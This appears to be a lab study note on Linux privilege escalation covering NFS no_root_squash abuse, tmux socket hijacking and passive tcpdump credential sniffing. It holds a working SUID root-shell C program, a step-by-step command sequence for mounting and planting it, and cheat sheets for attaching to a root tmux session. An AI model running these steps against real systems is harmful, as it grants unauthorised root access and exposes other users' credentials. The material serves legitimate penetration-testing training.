# Linux Privilege Escalation – NFS & Tmux

## Passive Traffic Capture

If `tcpdump` is installed, unprivileged users may sometimes be able to capture network traffic and recover sensitive information passing in cleartext or collect hashes for offline cracking.

Potentially useful captures include:

- HTTP credentials
- FTP credentials
- POP/IMAP credentials
- Telnet sessions
- SMTP authentication
- SNMP community strings
- Net-NTLMv2 / SMB / Kerberos material

Useful tools:

- `tcpdump`
- `net-creds`
- `PCredz`

This is not always direct privilege escalation, but it can lead to:

- credential reuse
- lateral movement
- escalation to more privileged local users

---

# Weak NFS Privileges

## Overview

**NFS (Network File System)** allows Unix/Linux systems to share files and directories over the network. It commonly uses:

- **TCP/UDP 2049**

If an NFS export is misconfigured with **`no_root_squash`**, a remote root user can create files on the share as **root** on the target system. This is extremely dangerous and can often be turned into root access via a SUID binary.

---

## Enumerating NFS Exports

To list exports remotely:

```bash
showmount -e 10.129.2.12
```

Example output:

```text
Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

This shows two exported directories.

---

## Important NFS Options

| Option | Description |
|--------|-------------|
| `root_squash` | Maps remote root to the unprivileged `nfsnobody` user |
| `no_root_squash` | Keeps remote root as root on the NFS server |

### Why `no_root_squash` is dangerous

If `no_root_squash` is enabled, then a root user on the client system can:

- create files on the NFS share as root
- upload a binary owned by root
- set the **SUID bit**
- execute it locally on the target to gain root

---

## Confirming Export Options

If we have local visibility on the host, check:

```bash
cat /etc/exports
```

Example:

```conf
# /etc/exports: the access control list for filesystems which may be exported
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

This confirms both exports are vulnerable.

---

# Exploiting `no_root_squash`

## Step 1 – Create a SUID shell binary locally

Create a simple C program:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
```

Save it as `shell.c`.

Compile it:

```bash
gcc shell.c -o shell
```

---

## Step 2 – Mount the vulnerable export

```bash
sudo mount -t nfs 10.129.2.12:/tmp /mnt
```

---

## Step 3 – Copy the binary and set SUID

```bash
cp shell /mnt
chmod u+s /mnt/shell
```

Because the export uses `no_root_squash`, the file will be created as **root-owned** on the target.

---

## Step 4 – Execute the binary on the target

On the target host, as the low-privileged user:

```bash
ls -la /tmp
```

Example output:

```text
-rwsr-xr-x  1 root root 16712 Sep  1 06:15 shell
```

Run it:

```bash
./shell
```

Confirm escalation:

```bash
id
```

Expected result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

# NFS Exploitation Workflow Summary

## Enumeration

```bash
showmount -e <target>
cat /etc/exports
```

## Build payload

```bash
gcc shell.c -o shell
```

## Mount export

```bash
sudo mount -t nfs <target>:/tmp /mnt
```

## Copy and set SUID

```bash
cp shell /mnt
chmod u+s /mnt/shell
```

## Execute on target

```bash
/tmp/shell
id
```

---

# Key NFS Takeaways

- `no_root_squash` is the dangerous setting
- it lets remote root remain root on the NFS server
- if we can mount the export as root from our attacking box, we can often:
  - upload a SUID binary
  - place SSH keys
  - overwrite scripts
  - create privileged files

---

# Hijacking Tmux Sessions

## Overview

**tmux** is a terminal multiplexer that allows multiple terminal sessions inside one console. Users can:

- create sessions
- detach from them
- leave them running in the background
- reattach later

If a privileged user, such as **root**, creates a tmux session with a socket that another user can access, that session may be hijackable.

This can directly lead to privilege escalation.

---

## How Tmux Sharing Works

A tmux session can be tied to a custom socket using `-S`:

```bash
tmux -S /shareds new -s debugsess
```

If the socket file is then made accessible to another group:

```bash
chown root:devs /shareds
```

and permissions allow group read/write access, any member of that group may be able to attach to the session.

---

## Example Misconfiguration

A privileged user creates a session:

```bash
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```

Now the socket is owned by:

- user: `root`
- group: `devs`

If another user belongs to `devs`, they may be able to attach and inherit the existing terminal context.

---

# Enumerating Tmux Sessions

## Check for running tmux processes

```bash
ps aux | grep tmux
```

Example:

```text
root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

This tells us:

- tmux is running
- it is owned by `root`
- it uses socket `/shareds`

---

## Check socket permissions

```bash
ls -la /shareds
```

Example:

```text
srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

This is the important part:

- socket owned by `root`
- group = `devs`
- group has read/write access

---

## Confirm our group membership

```bash
id
```

Example:

```text
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Because we are in `devs`, we can likely attach.

---

# Hijacking the Session

Attach to the socket:

```bash
tmux -S /shareds
```

If successful, we join the running root session.

Then confirm privileges:

```bash
id
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

# Tmux Exploitation Workflow Summary

## Enumerate running tmux sessions

```bash
ps aux | grep tmux
```

## Inspect socket permissions

```bash
ls -la /shareds
```

## Check our groups

```bash
id
```

## Attach to the session

```bash
tmux -S /shareds
```

## Confirm root

```bash
id
whoami
```

---

# Why Tmux Hijacking Works

Tmux uses a **Unix socket** for session communication.

If:

- the session was started by root
- the socket is accessible to our group
- we can attach to it

then we may effectively inherit a root interactive shell.

It is like finding a master key left in a shared drawer.

---

# Quick Checks for Tmux Abuse

Look for:

- tmux running as `root`
- custom sockets in unusual locations
- sockets with group write permissions
- membership in the socket’s group

Useful commands:

```bash
ps aux | grep tmux
find / -type s 2>/dev/null | grep tmux
ls -la /tmp /dev/shm /run /shareds 2>/dev/null
id
```

---

# Comparison: NFS vs Tmux

| Vector | Requirement | Result |
|--------|-------------|--------|
| NFS `no_root_squash` | Root on client + mountable export | Upload SUID/root-owned files |
| Tmux hijack | Access to privileged tmux socket | Attach to root session directly |

---

# Key Takeaways

## NFS

- always check exported shares with `showmount -e`
- `no_root_squash` is a major red flag
- this often leads to root through a SUID payload

## Tmux

- check for root-owned tmux sessions
- inspect socket ownership and permissions
- if the socket is shared with one of our groups, attach immediately

---

# Cheatsheet

## NFS

```bash
showmount -e <target>
cat /etc/exports
sudo mount -t nfs <target>:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
/tmp/shell
```

## Tmux

```bash
ps aux | grep tmux
ls -la /shareds
id
tmux -S /shareds
id
```

---

# Tags

#linux
#privilege-escalation
#nfs
#tmux
#no_root_squash
#suid
#enumeration
#misconfiguration
#obsidian